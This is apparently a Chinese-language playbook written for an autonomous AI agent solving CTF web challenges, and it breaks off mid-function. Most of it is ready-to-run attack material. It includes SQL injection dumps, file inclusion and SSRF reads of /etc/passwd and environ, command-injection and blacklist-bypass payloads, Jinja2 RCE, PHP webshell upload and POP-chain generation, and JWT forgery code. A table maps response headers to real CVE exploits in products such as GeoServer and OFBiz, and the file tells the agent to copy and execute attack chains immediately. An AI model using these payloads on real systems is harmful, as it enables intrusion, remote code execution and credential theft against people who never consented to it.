# Web 渗透测试 Skill — CTF Web 题全流程指引

## 适用场景
CTF Web 类题目，包括 SQL 注入、XSS、文件包含、命令注入、SSRF、反序列化、JWT 伪造、目录穿越、逻辑漏洞等。

---

## ❗ HTTP 响应特征 → 确定性攻击动作（最重要，优先查此表）

首页 curl 返回后，立即对照以下表格。匹配到特征就按“立即执行”列操作，不要自己猜测。

| 响应特征 | 含义 | 立即执行 |
|----------|------|----------|
| 输出含 `password=xxx` 或 `passwd: xxx` | 泄露的凭据 | 用该密码尝试登录所有发现的登录接口 |
| 403 + 响应头含 `X-Admin-Key` 或类似 | Header 鉴权 | `curl -H 'X-Admin-Key: true'` 或 `X-Admin: 1` 等布尔值绕过 |
| `Server: GeoServer` 或 HTML 含 geoserver | GeoServer | `security_search("GeoServer CVE-2024-36401 RCE")` |
| HTML 含 `gradio` 或 `gr-` 前缀 | Gradio | `security_search("Gradio CVE-2024-1561 file read")` |
| `X-Powered-By: Express` | Node.js Express | 检查原型污染、SSTI、路径穿越 |
| `X-Powered-By: ThinkPHP` | ThinkPHP | `security_search("ThinkPHP 5.x RCE")` |
| `X-Powered-By: Next.js` | Next.js | `security_search("Next.js CVE-2025-29927 middleware bypass")` |
| HTML 含 `<title>Login</title>` + 无其他线索 | 需破解登录 | 先试弱口令(admin/admin, admin/123456)，再试 SQL 注入(`admin' or 1=1--`) |
| 响应含 `highlight_file(__FILE__)` | PHP 源码审计题 | 读懂源码逻辑，找绕过条件（见 “阶段四 PHP 类型混淆”节） |
| 响应含 `.php` 路径 + `file=` 参数 | 文件包含点 | `?file=php://filter/convert.base64-encode/resource=index.php` |
| 响应含 `?page=` 或 `?tpl=` | 模板/文件包含 | `?page=../../../etc/passwd` 和 `?page={{7*7}}` 都试 |
| 响应头 `Set-Cookie: session=eyJ` | Flask session | `flask-unsign --unsign --cookie xxx` 尝试破解密钥 |
| 响应头 `Authorization: Bearer eyJ` | JWT | 解码 JWT→检查 alg→尝试 none/弱密钥 |
| 响应含 `upload` 或文件上传表单 | 文件上传点 | 上传 webshell（.php/.phtml），见 “文件上传绕过”节 |
| 响应含 `?url=` 或 `?fetch=` | SSRF 点 | `?url=file:///etc/passwd` 和 `?url=http://127.0.0.1` |
| 响应含 `?cmd=` 或 `?ip=` 或 `?host=` | 命令注入点 | `;id` 、`|id`、`$(id)` 全试 |
| HTML 含 `phpinfo()` | PHP 信息泄露 | 查看 disable_functions、版本、配置路径 |
| `.git/HEAD` 返回 `ref: refs/heads/` | Git 泄露 | `git-dumper http://TARGET/.git/ ./dump/` 然后审计源码 |
| `robots.txt` 含隐藏路径 | 目录信息 | 立即访问每个被禁止的路径 |
| HTML 含 `1panel` 或 `/api/v1/auth/login` | 1Panel 面板 | `security_search("1Panel CVE-2024-39907 SQL injection")` + 查 cve-cheatsheet.json 登录格式 |
| `Server: Python` + 路径含 `/api/manager` | ComfyUI-Manager | `security_search("ComfyUI-Manager CVE-2025-67303 config RCE")` |
| HTTPS 8443 + HTML 含 `ofbiz` 或 `webtools` | Apache OFBiz | `security_search("OFBiz CVE-2023-51467 auth bypass RCE")` + 试默认口令 admin/ofbiz |
| 端口 3000 + HTML 含 `Next.js` 或 `data-public-api-prefix` | Dify (Next.js) | `security_search("Dify React2Shell CVE-2025-55182 RCE")` + 注意同主机可能有其他可 exploit 服务 |

---

## 🚨 立足点→RCE 转化检查清单（卡住时必看）

**当你已经拿到认证/文件读写/配置修改，但无法执行命令时，按此清单逐条排查：**

### 规则 1：Observer 纠偏 = 最高优先级
> 如果 Observer 明确指出了攻击路径（如"立即打 CVE-XXXX SQLi"），**立即停止当前方向，执行 Observer 指示的路径**。Observer 能看到 memory 中的失败边界，它的指示基于全局视角。

### 规则 2：同一方向 3 次失败 = 强制换方向
> 如果同一类请求（如 file write、config modify）已尝试 3 次以上且都失败，**禁止再试第 4 次**。切换到 skill 中该产品的其他攻击路径。

### 规则 3：已认证 → 优先找已知 CVE
> 拿到有效 session/token 后，第一件事是 `security_search("产品名 CVE RCE")`，而不是手动枚举 API 端点。

### 规则 4：配置修改后 → 尝试所有触发方式
> 如果修改了配置文件但服务未重启，按顺序尝试：
> 1. 重启端点（注意路径前缀差异，如 `/manager/reboot` vs `/api/manager/reboot`）
> 2. 配置热加载端点（`/reload`、`/refresh`、`/actuator/refresh`）
> 3. 触发错误使服务崩溃自动重启（发畸形请求）
> 4. 等待 60s 观察配置是否自动生效

### 规则 5：黑名单绕过 → 系统化分类，不逐个试关键字
> 当黑名单拦截时，不要逐个测试关键字。按类别系统化尝试：
> 1. **字符串拼接**：`"Ru"+"ntime"` 绕过完整关键词检测
> 2. **反射调用**：`Class.forName()` + `getMethod().invoke()`
> 3. **编码绕过**：Unicode 编码、Base64 解码执行
> 4. **替代 API**：`ProcessBuilder` 替代 `Runtime`，`ScriptEngine` 替代直接执行
> 5. 每类只试 1 个 payload，不要用同类的多个变体

### 规则 6：Skill 中的攻击链 = 已验证路径
> 如果 skill 中该产品章节有完整攻击链（含 curl 命令），**直接复制执行**，不要"从零探测"。

---

## 阶段一：基础侦察

### 1.1 首次探测目标
```bash
# 获取首页，看响应头和内容
curl -i http://TARGET_URL

# 查看 robots.txt
curl http://TARGET_URL/robots.txt

# 查看 sitemap
curl http://TARGET_URL/sitemap.xml
```

**重点观察：**
- Server 头（nginx/Apache/Python/PHP 版本）
- Set-Cookie（session 格式、token 类型）
- 响应体（框架特征、注释、隐藏字段）
- 重定向行为

### 1.2 目录扫描
```bash
# 常用字典扫描
ffuf -u http://TARGET_URL/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403

# 扩展名扫描
ffuf -u http://TARGET_URL/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.bak,.zip,.tar.gz -mc 200,301,302,403

# 递归扫描某个子路径
ffuf -u http://TARGET_URL/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,301,302
```

### 1.3 参数发现
```bash
# 对已知页面枚举 GET 参数
ffuf -u "http://TARGET_URL/page?FUZZ=test" -w /usr/share/wordlists/dirb/common.txt -fs 1234

# POST 参数枚举（先观察正常表单的响应大小，用 -fs 过滤）
ffuf -u http://TARGET_URL/login -X POST -d "FUZZ=test&password=test" -w /usr/share/wordlists/dirb/common.txt -fs 1234
```

---

## 阶段二：漏洞识别与利用

### 2.1 SQL 注入

**快速检测：**
```bash
# 单引号测试
curl -s "http://TARGET_URL/login" -d "username=admin'&password=x"

# 布尔盲注测试
curl -s "http://TARGET_URL/item?id=1 AND 1=1"
curl -s "http://TARGET_URL/item?id=1 AND 1=2"
```

**sqlmap 自动化：**
```bash
# GET 参数注入
sqlmap -u "http://TARGET_URL/item?id=1" --batch --dbs

# POST 参数注入
sqlmap -u "http://TARGET_URL/login" --data="username=admin&password=test" --batch --dbs

# 指定数据库，列表
sqlmap -u "http://TARGET_URL/item?id=1" --batch -D TARGET_DB --tables
sqlmap -u "http://TARGET_URL/item?id=1" --batch -D TARGET_DB -T TARGET_TABLE --dump

# 绕过 WAF
sqlmap -u "http://TARGET_URL/item?id=1" --batch --tamper=space2comment,between --dbs
```

**手工 Union 注入流程：**
```bash
# 1. 确定列数
curl -s "http://TARGET_URL/item?id=1 ORDER BY 3--"  # 不报错说明有3列
curl -s "http://TARGET_URL/item?id=1 ORDER BY 4--"  # 报错说明只有3列

# 2. 找显示位
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,2,3--"

# 3. 读数据
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'--"
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--"

# 4. 读文件（需要 FILE 权限）
curl -s "http://TARGET_URL/item?id=0 UNION SELECT 1,load_file('/etc/passwd'),3--"
```

**常用绕过技巧：**
```
空格绕过：用 /**/ 或 %09（tab）或 %0a（换行）代替空格
关键字绕过：uNiOn SeLeCt 或 UNION/**/SELECT
引号绕过：用 0x十六进制 代替字符串，如 0x666c6167 = 'flag'
```

### 2.2 文件包含（LFI/RFI）

**检测：**
```bash
curl -s "http://TARGET_URL/page?file=../../../etc/passwd"
curl -s "http://TARGET_URL/page?file=....//....//....//etc/passwd"
curl -s "http://TARGET_URL/page?file=php://filter/convert.base64-encode/resource=index.php"
```

**读取源码（PHP）：**
```bash
# base64 编码读取，避免被执行
curl -s "http://TARGET_URL/page?file=php://filter/convert.base64-encode/resource=config.php" | grep -oP '[A-Za-z0-9+/=]{20,}' | head -1 | base64 -d
```

**常见目标文件：**
```
/etc/passwd
/etc/hosts
/proc/self/environ
/var/log/apache2/access.log  （日志注入 getshell）
../config.php
../database.php
```

### 2.3 命令注入

**检测 payload：**
```bash
# 用 sleep 盲注检测
curl -s "http://TARGET_URL/ping?host=127.0.0.1;sleep 3"
curl -s "http://TARGET_URL/ping?host=127.0.0.1|sleep 3"
curl -s "http://TARGET_URL/ping?host=127.0.0.1%0asleep%203"

# 有回显时直接读 flag
curl -s "http://TARGET_URL/ping?host=127.0.0.1;cat /flag"
curl -s "http://TARGET_URL/ping?host=127.0.0.1;find / -name flag 2>/dev/null | head -5 | xargs cat"
```

**绕过过滤：**
```bash
# 空格绕过
cat${IFS}/flag
cat</flag

# 关键词绕过
c''at /flag
ca\t /flag

# 编码绕过
echo "Y2F0IC9mbGFn" | base64 -d | bash
```

### 2.4 SSTI（服务端模板注入）

**检测（各框架通用）：**
```bash
# 数学表达式检测
curl -s "http://TARGET_URL/page?name={{7*7}}"   # 返回 49 → 存在 SSTI
curl -s "http://TARGET_URL/page?name=${7*7}"    # FreeMarker/Thymeleaf
```

**Jinja2（Python/Flask）利用：**
```bash
# 读文件
curl -s "http://TARGET_URL/page?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}"

# 通用 payload
curl -s "http://TARGET_URL/page?name={{''.__class__.__mro__[1].__subclasses__()[396]('cat /flag',shell=True,stdout=-1).communicate()[0]}}"
```

### 2.5 JWT 伪造

```bash
# 1. 解码 JWT（base64）
echo "eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoidXNlciJ9.xxx" | cut -d. -f2 | base64 -d 2>/dev/null

# 2. 弱密钥爆破
# 安装: pip install flask-unsign
flask-unsign --unsign --cookie "SESSION_TOKEN" --wordlist /usr/share/wordlists/rockyou.txt

# 3. 伪造（知道密钥后）
flask-unsign --sign --cookie "{'role': 'admin'}" --secret 'weak_secret'

# 4. alg=none 攻击（手动构造）
python3 -c "
import base64, json
header = base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({'role':'admin'}).encode()).rstrip(b'=')
print(f'{header.decode()}.{payload.decode()}.')
"
```

### 2.6 文件上传绕过

```bash
# 测试允许的扩展名
curl -s -X POST http://TARGET_URL/upload -F "file=@shell.php" -F "filename=shell.php"
curl -s -X POST http://TARGET_URL/upload -F "file=@shell.php;type=image/jpeg" -F "filename=shell.pHp"
curl -s -X POST http://TARGET_URL/upload -F "file=@shell.php" -F "filename=shell.php.jpg"

# PHP webshell 内容
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 测试 webshell
curl -s "http://TARGET_URL/uploads/shell.php?cmd=id"
curl -s "http://TARGET_URL/uploads/shell.php?cmd=find+/+−name+flag+2>/dev/null"
```

### 2.7 SSRF

**基础检测：**
```bash
# 内网探测
curl -s "http://TARGET_URL/fetch?url=http://127.0.0.1:80"
curl -s "http://TARGET_URL/fetch?url=http://192.168.1.1"

# 读取本地文件
curl -s "http://TARGET_URL/fetch?url=file:///etc/passwd"
curl -s "http://TARGET_URL/fetch?url=file:///flag"
```

**❗ SSRF URL 绕过系统化流程（按优先级逐个尝试，每种只试 1 次）：**

```python
import urllib.parse

# === 第 1 组：IP 形式变体 ===
payloads_ip = [
    "http://127.0.0.1/",
    "http://127.1/",
    "http://0.0.0.0/",
    "http://0x7f000001/",            # 十六进制
    "http://2130706433/",            # 十进制
    "http://0177.0.0.1/",            # 八进制
    "http://[::1]/",                 # IPv6
    "http://[0:0:0:0:0:ffff:127.0.0.1]/",
]

# === 第 2 组：DNS 重绑定 ===
payloads_dns = [
    "http://127.0.0.1.nip.io/",
    "http://localtest.me/",          # 解析到 127.0.0.1
    "http://spoofed.burpcollaborator.net/",  # 如有自己的 DNS
]

# === 第 3 组：URL 解析差异 ===
payloads_parse = [
    "http://evil.com@127.0.0.1/",    # userinfo 混淆
    "http://127.0.0.1#@evil.com/",   # fragment 混淆
    "http://127.0.0.1%00@evil.com/", # null byte
    "http://127.0.0.1\\@evil.com/",  # 反斜杠
    "http:///127.0.0.1/",            # 三斜杠
    "http:\\\\127.0.0.1/",            # 反斜杠协议
]

# === 第 4 组：编码变体 ===
payloads_encode = [
    "http://%31%32%37%2e%30%2e%30%2e%31/",    # 单次 URL 编码
    "http://%25%33%31%25%33%32%25%33%37%2e0%2e0%2e1/",  # 双重编码
    "http://\u0031\u0032\u0037.0.0.1/",      # unicode
]

# === 第 5 组：协议变体 ===
payloads_proto = [
    "gopher://127.0.0.1:80/_GET%20/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a",
    "dict://127.0.0.1:6379/INFO",
    "file:///etc/passwd",
]

# === 第 6 组：Host 头注入 ===
# curl -H 'Host: internal-api' http://TARGET/fetch?url=http://127.0.0.1/

# === 第 7 组：重定向跳转 ===
# 先 SSRF 到自己的服务器，返回 302 跳到内网
# python3 -m http.server + redirect handler

# === 第 8 组：CRLF 注入 ===
payloads_crlf = [
    "http://allowed.com%0d%0aHost:%20127.0.0.1%0d%0a/",
]
```

**SSRF 成功后的标准动作（很多题 flag 在内网 API 中）：**
```bash
# 1. 从 localhost 视角扫描常见内网服务端口
for port in 80 3000 5000 6379 8000 8080 8888 9000; do
  curl -s "http://TARGET/fetch?url=http://127.0.0.1:$port/" -o /dev/null -w "port $port: %{http_code}\n"
done

# 2. 对每个可达端口，访问 flag 相关路径
for path in / /flag /admin /debug/config /api/flag /env /actuator/env; do
  echo "=== $path ==="
  curl -s "http://TARGET/fetch?url=http://127.0.0.1:PORT$path"
done

# 3. 读取环境变量
curl -s "http://TARGET/fetch?url=file:///proc/1/environ" | tr '\0' '\n'
curl -s "http://TARGET/fetch?url=file:///proc/self/environ" | tr '\0' '\n'

# 4. 读取 Web 服务器配置找内网服务
curl -s "http://TARGET/fetch?url=file:///etc/nginx/nginx.conf"
curl -s "http://TARGET/fetch?url=file:///etc/apache2/sites-enabled/000-default.conf"

# 5. 探测已知内网主机名（从配置/代码中发现的）
curl -s "http://TARGET/fetch?url=http://internal-api:5000/"
curl -s "http://TARGET/fetch?url=http://admin-api:8080/"
```

### 2.8 PHP 反序列化攻击（高级）

**系统化流程（必须按顺序执行）：**

```
Step 1: 读取完整源码，列出所有类和魔术方法
    grep -n 'class \|__destruct\|__wakeup\|__toString\|__call\|__get' *.php

Step 2: 找入口点（触发反序列化的方法）
    __destruct() / __wakeup() → 自动触发
    __toString() → 需要对象被当作字符串使用

Step 3: 找 sink（最终执行危险操作的函数）
    file_put_contents() → 写 webshell
    system() / exec() / popen() → 命令执行
    eval() / assert() → 代码执行
    include() / require() → 文件包含

Step 4: 用 Python 生成 payload（禁止手写序列化字符串）
```

**Python 生成 PHP 序列化 payload 模板：**
```python
def php_serialize_string(s):
    b = s.encode('utf-8') if isinstance(s, str) else s
    return f's:{len(b)}:"{b.decode("latin-1")}"'

def php_serialize_object(classname, props):
    """props: dict of {name: serialized_value}"""
    parts = []
    for name, val in props.items():
        parts.append(php_serialize_string(name))
        parts.append(val)
    return f'O:{len(classname)}:"{classname}":{len(props)}:{{{";".join(parts)};}}'

# 示例：构造 POP 链
# class ReportRenderer { public $outputPath; public $content; }
# __destruct() 中调用 file_put_contents($this->outputPath, $this->content)
payload = php_serialize_object('ReportRenderer', {
    'outputPath': php_serialize_string('/var/www/html/shell.php'),
    'content': php_serialize_string('<?php system($_GET["c"]); ?>'),
})
print(payload)
```

**白名单绕过技巧（当嵌套类被拦截时）：**
1. **phar:// 协议**：上传合法扩展名的 phar 文件，通过 `phar://uploads/xxx.jpg` 触发反序列化
2. **属性值注入**：如果只有单层对象能过白名单，尝试在属性值中注入 PHP 代码（如 name 字段写入 webshell 内容）
3. **类名大小写**：PHP 类名不区分大小写，尝试 `reportrenderer` vs `ReportRenderer`
4. **S: 编码字符串**：用 `S:` 代替 `s:` 支持十六进制转义（如 `S:4:"\74est"`）
5. **系统化测试每个属性**：将 renderer/parser/engine 等属性逐个替换为不同类，确认哪些类被放行

### 2.9 JWT kid 攻击（高级）

**系统化流程（按顺序执行，每步只试 1 次）：**

```python
import base64, json, hmac, hashlib

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

def forge_jwt(header_dict, payload_dict, secret=b''):
    h = b64url(json.dumps(header_dict))
    p = b64url(json.dumps(payload_dict))
    if header_dict.get('alg') == 'none':
        return f'{h}.{p}.'
    sig = hmac.new(secret, f'{h}.{p}'.encode(), hashlib.sha256).digest()
    return f'{h}.{p}.{b64url(sig)}'

# Step 1: alg=none
token = forge_jwt({'alg':'none','typ':'JWT'}, {'role':'admin','email':'admin@example.com'})

# Step 2: kid=/dev/null (空密钥)
token = forge_jwt({'alg':'HS256','typ':'JWT','kid':'/dev/null'}, {'role':'admin'}, b'')

# Step 3: kid 指向已知内容文件
readme_content = open('/tmp/readme.txt','rb').read().strip()
token = forge_jwt({'alg':'HS256','typ':'JWT','kid':'../../public/static/README.md'}, {'role':'admin'}, readme_content)

# Step 4: kid SQL 注入
token = forge_jwt({'alg':'HS256','typ':'JWT','kid':"' UNION SELECT 'mysecret'--"}, {'role':'admin'}, b'mysecret')

# Step 5: kid 指向密钥文件（先尝试下载）
# curl -s http://TARGET/public/static/prod.key > /tmp/prod.key
# curl -s http://TARGET/static/prod.key > /tmp/prod.key
# curl -s http://TARGET/keys/prod.key > /tmp/prod.key
key = open('/tmp/prod.key','rb').read().strip()
token = forge_jwt({'alg':'HS256','typ':'JWT','kid':'prod.key'}, {'role':'admin'}, key)
```

**关键要点：**
- **先确认 token 是否生效**：分别用无 token/垃圾 token/伪造 token 访问，对比响应差异
- **从静态资源目录下载密钥**：近的安全问题很多来自迁移后密钥文件残留在 web 可访问目录
- **kid 路径穿越**：`../../` 可以穿越到任意文件

---

## 阶段三：权限提升与 Flag 获取

```bash
# 常见 flag 位置
cat /flag
cat /flag.txt
find / -name "flag*" 2>/dev/null
find / -name "*.txt" 2>/dev/null | xargs grep -l "flag{" 2>/dev/null

# 数据库中找 flag
# （在 SQL 注入成功后）
# SELECT flag FROM flags;
# SELECT * FROM flag;

# 环境变量中找 flag
env | grep -i flag
cat /proc/self/environ | tr '\0' '\n' | grep -i flag
```

---

## 阶段四：PHP 类型混淆与 MD5 绕过

### 4.1 正确读取 highlight_file() 页面的执行结果

**极重要**：`highlight_file(__FILE__)` 会把 PHP 源码里的所有字符串渲染成 HTML 着色输出，包括 `echo "没活儿"` 等错误分支的字符串。因此**不能用 grep 源码字符串来判断运行结果**。

正确做法：**读取 `</code>` 标签之后的内容**，那才是运行时 echo 的实际输出。

```python
import requests, html, re

resp = requests.get(url, params=params, data=data)
# 分割 </code> 标签，取后半部分
parts = resp.text.split('</code>', 1)
runtime_output = parts[1] if len(parts) > 1 else ''
runtime_output = html.unescape(runtime_output)  # 还原 &lt; &gt; 等实体

# 查找 flag
m = re.search(r'NSSCTF\{[^}]+\}|flag\{[^}]+\}|CTF\{[^}]+\}', runtime_output)
if m:
    print("FLAG:", m.group())
else:
    print("No flag. Runtime output:", runtime_output[:500])
```

**注意**：flag 里的 `<` `>` 会被 HTML 实体化为 `&lt;` `&gt;`，必须先 `html.unescape()` 再匹配。

### 4.2 PHP MD5 弱比较绕过（`==`）

条件：`if ($a != $b && md5($a) == md5($b))`

利用 PHP 弱比较：MD5 以 `0e` 开头的字符串会被当作浮点数（科学计数法）进行比较。

```bash
# GET 参数传递（两个 md5 都以 0e 开头）
curl -s "http://TARGET/leve2.php?a=QNKCDZO&b=240610708"

# 其他已知 0e 对：
# a=s878926199a&b=s155964671a
# a=s214587387a&b=s214587387a（不同字符串）
```

### 4.3 PHP MD5 严格比较绕过（`===`）

条件：`if ($a !== $b && md5($a) === md5($b))`

**方案 A：array bypass（PHP 7.0~7.2 有效，PHP 7.3+ 和 PHP 8 均无效）**

PHP 7.0~7.2 中 `md5(array)` 返回 `null`，`null === null` 为 true：
```bash
curl -s "http://TARGET/page" -d "c[]=1&d[]=2"
# PHP 7.3：md5(array) 返回 false 并产生 Warning，false === false 但 $c !== $d 不满足，或 === false 比较失败
# PHP 8：触发 TypeError，md5 返回 false，=== 比较失败
# 实测：发出请求后读 </code> 后内容，若没有 flag 说明 array bypass 无效，直接换方案 B
```

**验证当前 PHP 版本是否支持 array bypass**（直接发请求，看结果）：
```bash
curl -s "http://TARGET/page?a=QNKCDZO&b=240610708" -d "c[]=1&d[]=2" \
  | python3 -c "import sys,html; t=sys.stdin.read(); p=t.split('</code>',1); print(html.unescape(p[1][:300]) if len(p)>1 else t[-300:])"
```

**方案 B：真实 MD5 二进制碰撞（PHP 7 & 8 均有效）**

**第一步：用 fastcoll 生成碰撞对**

```bash
# 安装 fastcoll（CTF 容器内通常可直接编译）
apt-get install -y g++ libboost-all-dev
wget -O /tmp/fastcoll.zip "https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.zip"
unzip /tmp/fastcoll.zip -d /tmp/fc && cd /tmp/fc
g++ -O2 -o /tmp/fastcoll fastcoll_v1.0.0.5_source/*.cpp

# 生成碰撞对（输出 msg1.bin 和 msg2.bin，MD5 相同，内容不同）
/tmp/fastcoll -o /tmp/msg1.bin /tmp/msg2.bin

# 验证
md5sum /tmp/msg1.bin /tmp/msg2.bin  # 两个 hash 应相同
python3 -c "
c=open('/tmp/msg1.bin','rb').read(); d=open('/tmp/msg2.bin','rb').read()
import hashlib
print('equal:', hashlib.md5(c).hexdigest()==hashlib.md5(d).hexdigest())
print('null in c:', any(b==0 for b in c))
print('null in d:', any(b==0 for b in d))
"
```

⚠️ **如果碰撞对含 null byte（`\x00`）**：PHP 的 `md5()` 本身能处理 null byte，但 PHP POST 参数接收时可能截断于 null byte（取决于服务器配置）。遇到此情况需重新生成，直到得到无 null byte 的碰撞对。

**第二步：正确传输二进制数据到 `$_POST`**

⚠️ **不能用 `requests files={'c': (None, c)}`**：这会把数据放入 `$_FILES` 而非 `$_POST`，导致 `isset($_POST['c'])` 返回 false。必须手动构造 multipart body：

```python
import requests, html, re, hashlib, os

url = "http://TARGET/page"
params = {"a": "QNKCDZO", "b": "240610708"}

c = open("/tmp/msg1.bin", "rb").read()
d = open("/tmp/msg2.bin", "rb").read()

# 本地验证
assert c != d
assert hashlib.md5(c).hexdigest() == hashlib.md5(d).hexdigest()
print("本地 md5 验证通过:", hashlib.md5(c).hexdigest())

# 用随机 boundary 手动构造 multipart/form-data
boundary = "Boundary" + os.urandom(8).hex()
body = (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="c"\r\n\r\n'
).encode() + c + b"\r\n" + (
    f"--{boundary}\r\n"
    f'Content-Disposition: form-data; name="d"\r\n\r\n'
).encode() + d + b"\r\n" + (
    f"--{boundary}--\r\n"
).encode()

resp = requests.post(
    url, params=params, data=body,
    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"}
)

# 正确读取执行结果（必须读 </code> 之后的内容）
parts = resp.text.split("</code>", 1)
runtime_output = html.unescape(parts[1]) if len(parts) > 1 else resp.text
print("Runtime output:", runtime_output[:500])
m = re.search(r'NSSCTF\{[^}]+\}|flag\{[^}]+\}', runtime_output)
if m:
    print("FLAG:", m.group())
```

### 4.4 PHP 源码读取（$FLAG 变量来源追踪）

当进入 `echo $FLAG` 分支但输出为空时，需系统排查 `$FLAG` 的注入来源。CTF PHP 题标准注入路径：

**调查顺序**：

**第一步：读取当前脚本和 index.php**
```bash
# php filter 读取 index.php（看 auto_prepend_file 或 $FLAG 直接赋值）
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=index.php&b=php://filter/convert.base64-encode/resource=index.php" \
  | python3 -c "import sys,re,base64; t=sys.stdin.read(); m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}', t); print(base64.b64decode(m.group()).decode('utf-8','replace') if m else 'no b64')"

# 读取 leve2.php 本身
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=leve2.php&b=php://filter/convert.base64-encode/resource=leve2.php" \
  | python3 -c "import sys,re,base64; t=sys.stdin.read(); m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}', t); print(base64.b64decode(m.group()).decode('utf-8','replace') if m else 'no b64')"
```

**第二步：读 /proc/self/environ（Docker 环境变量注入最常见路径）**
```bash
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=/proc/self/environ&b=php://filter/convert.base64-encode/resource=/proc/self/environ" \
  | python3 -c "
import sys,re,base64,html
t=sys.stdin.read(); parts=t.split('</code>',1)
after=html.unescape(parts[1]) if len(parts)>1 else t
m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}', after)
if m:
    decoded=base64.b64decode(m.group()+'==').decode('utf-8','replace')
    print(decoded.replace('\x00','\n'))
else:
    print('no b64. after:', after[:300])
"
```

**第三步：读 php.ini（查 auto_prepend_file 指令）**
```bash
# 找 PHP 版本对应的 php.ini 路径
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=/etc/php/7.3/fpm/php.ini&b=php://filter/convert.base64-encode/resource=/etc/php/7.3/fpm/php.ini" \
  | python3 -c "import sys,re,base64; t=sys.stdin.read(); m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}',t); raw=base64.b64decode(m.group()+'==').decode('utf-8','replace') if m else 'no b64'; print([l for l in raw.splitlines() if 'auto_prepend' in l.lower() or 'flag' in l.lower() or 'FLAG' in l])"

# 也试 php-fpm.conf
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=/etc/php/7.3/fpm/php-fpm.conf&b=php://filter/convert.base64-encode/resource=/etc/php/7.3/fpm/php-fpm.conf" \
  | python3 -c "import sys,re,base64; t=sys.stdin.read(); m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}',t); print(base64.b64decode(m.group()+'==').decode('utf-8','replace') if m else 'no b64')"
```

**第四步：读当前目录 .user.ini（web 目录级 auto_prepend_file）**
```bash
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=.user.ini&b=php://filter/convert.base64-encode/resource=.user.ini" \
  | python3 -c "import sys,re,base64; t=sys.stdin.read(); m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}',t); print(base64.b64decode(m.group()+'==').decode('utf-8','replace') if m else 'no b64')"

# 也试 web 根目录（通常是 /var/www/html）
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=/var/www/html/.user.ini&b=php://filter/convert.base64-encode/resource=/var/www/html/.user.ini" \
  | python3 -c "import sys,re,base64; t=sys.stdin.read(); m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}',t); print(base64.b64decode(m.group()+'==').decode('utf-8','replace') if m else 'no b64')"
```

**第五步：确认是否为 php-fpm（nginx fastcgi_param 注入路径）**
```bash
# 读 /proc/self/cmdline 确认进程类型
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=/proc/self/cmdline&b=php://filter/convert.base64-encode/resource=/proc/self/cmdline" \
  | python3 -c "import sys,re,base64; t=sys.stdin.read(); m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}',t); print(base64.b64decode(m.group()+'==').replace(b'\x00',b' ').decode('utf-8','replace') if m else 'no b64')"

# 若是 php-fpm，试读 nginx.conf（通常不可读，但可尝试）
curl -s "http://TARGET/leve2.php?a=php://filter/convert.base64-encode/resource=/etc/nginx/nginx.conf&b=php://filter/convert.base64-encode/resource=/etc/nginx/nginx.conf" \
  | python3 -c "import sys,re,base64; t=sys.stdin.read(); m=re.search(r'[A-Za-z0-9+/]{40,}={0,2}',t); print(base64.b64decode(m.group()+'==').decode('utf-8','replace') if m else 'no b64')"
```

**也可用 leve2.php filter 传 POST（适用于 md5 旁路场景）：**
```bash
# 用 multipart 传 binary 碰撞对 + filter 读文件
# 把上述 curl 里的 a= 参数换成 filter 路径，POST body 传 c=msg1 d=msg2
# 参考 4.3 方案 B 的 multipart 构造
```

---

### 4.5 两种失败态区分（极重要，防止混淆方向）

`highlight_file(__FILE__)` 页面存在**两种外观相似但含义完全不同的失败态**，必须在每次请求后立即用脚本判断是哪种，不能靠肉眼判断：

| 失败态 | `</code>` 之后的内容 | 含义 | 下一步 |
|---|---|---|---|
| **态 1：旁路成功，$FLAG 为空** | 空字符串（0 字节） | md5 条件已过，进入了 `echo $FLAG` 分支，但 `$FLAG` 本身是空字符串 | **调查 `$FLAG` 来源（见 4.4 节）**，不要继续调整传参格式 |
| **态 2：传输/比较失败** | 出现"没活儿"或类似字符串 | md5 条件未过（`md5($c) !== md5($d)` 或 `isset` 检查失败），未进入 flag 分支 | 调整碰撞对传输方式（null byte 问题、boundary 问题等） |

**自动判断脚本（每次发请求后立即跑）：**
```python
import html, re, sys

def check_failure_mode(resp_text: str, flag_format: str = r'NSSCTF\{[^}]+\}|flag\{[^}]+\}') -> str:
    """
    返回:
      'FLAG_FOUND'   → 找到 flag
      'MODE_1_EMPTY' → 旁路成功但 $FLAG 为空 → 调查 $FLAG 来源
